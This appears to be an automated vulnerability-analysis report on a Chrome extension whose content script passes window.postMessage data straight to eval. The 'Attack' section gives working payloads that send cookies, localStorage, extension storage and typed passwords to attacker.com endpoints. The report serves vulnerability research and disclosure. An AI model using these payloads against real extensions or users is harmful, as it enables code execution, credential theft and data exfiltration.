# CoCo Analysis: poojaaachdjfkiggckefbngdegikcdob

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (eval_sink)

---

## Sink: cs_window_eventListener_message → eval_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/poojaaachdjfkiggckefbngdegikcdob/opgen_generated_files/cs_0.js
Line 525	window.addEventListener("message",async message=>{
	message
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/poojaaachdjfkiggckefbngdegikcdob/opgen_generated_files/cs_0.js
Line 527	if(typeof message.data=="object"){
	message.data
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/poojaaachdjfkiggckefbngdegikcdob/opgen_generated_files/cs_0.js
Line 529	if(message.data.action=="eval")eval(message.data.content);
	message.data.content
```

**Code:**

```javascript
// Content script (background.js) - Lines 525-542
// This is the actual extension code (after third "// original" marker at line 465)

window.addEventListener("message", async message => {
    if(message.origin != location.origin) return; // Same-origin check (insufficient protection!)
    if(typeof message.data == "object"){
        if(!message.data.from_ch4ng34bl3) return; // Requires specific flag
        if(message.data.action == "eval") eval(message.data.content); // SINK: Direct eval!

        if(message.data.action == "getCookie"){
            window.postMessage({
                action: "getCookieResult",
                content: await _ch4ng34bl3.getCookie(message.data.content),
                from_ch4ng34bl3: true
            });
        }

        if(message.data.action == "pullImages"){
            var result = [];
            await document.querySelectorAll("img").forEach(img => {result.push(img.src);});
            window.postMessage({action: "pullImagesResult", content: result, from_ch4ng34bl3: true});
        }

        if(message.data.action == "ytmusicdiscordrpcCheck"){
            var result = false;
            if(_ch4ng34bl3.ytmusicdiscordrpc){
                if(_ch4ng34bl3.ytmusicdiscordrpc.socket){
                    if(_ch4ng34bl3.ytmusicdiscordrpc.socket.readyState == 1){
                        result = true;
                    }
                }
            }
            window.postMessage({action: "ytmusicdiscordrpcCheckResult", content: result, from_ch4ng34bl3: true});
        }
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// From any malicious webpage where the extension's content script runs
// The extension injects into <all_urls> per manifest.json

// Attack code that a malicious webpage can execute:
window.postMessage({
    from_ch4ng34bl3: true,
    action: "eval",
    content: "alert('Code execution in extension context!'); console.log(document.cookie);"
}, "*");

// More dangerous - steal all cookies and exfiltrate
window.postMessage({
    from_ch4ng34bl3: true,
    action: "eval",
    content: "fetch('https://attacker.com/steal', {method: 'POST', body: JSON.stringify({cookies: document.cookie, localStorage: localStorage, url: location.href})})"
}, "*");

// Execute arbitrary extension APIs available to content scripts
window.postMessage({
    from_ch4ng34bl3: true,
    action: "eval",
    content: "chrome.storage.sync.get(null, (data) => fetch('https://attacker.com/exfil', {method: 'POST', body: JSON.stringify(data)}))"
}, "*");

// Manipulate DOM with extension privileges
window.postMessage({
    from_ch4ng34bl3: true,
    action: "eval",
    content: "document.querySelectorAll('input[type=password]').forEach(el => el.addEventListener('input', e => fetch('https://attacker.com/passwords', {method: 'POST', body: e.target.value})))"
}, "*");
```

**Impact:** CRITICAL - Arbitrary JavaScript code execution in the content script context with extension privileges. The origin check (`message.origin != location.origin`) provides NO protection because:

1. **Attacker controls the origin:** A malicious webpage sends postMessage to itself (same origin)
2. **Flag is trivially bypassable:** The `from_ch4ng34bl3` flag is just a boolean that attacker can set
3. **Runs on all websites:** The content script matches `<all_urls>`, so ANY website can exploit this
4. **Full code execution:** The eval executes arbitrary JavaScript with extension's content script privileges

The attacker can:
- Execute arbitrary code in the extension context
- Access and manipulate the DOM with extension privileges
- Steal cookies, localStorage, and other sensitive page data
- Access extension storage via chrome.storage APIs
- Intercept user inputs (passwords, form data, etc.)
- Perform actions on behalf of the user
- Bypass Content Security Policy restrictions

**Note on Origin Check:** The check `if(message.origin != location.origin) return;` only prevents cross-origin attacks, but since the attacker controls their own webpage (which is the same origin as the message sender), this check is ineffective. A webpage can always send postMessage to itself, and the content script will accept and process it.
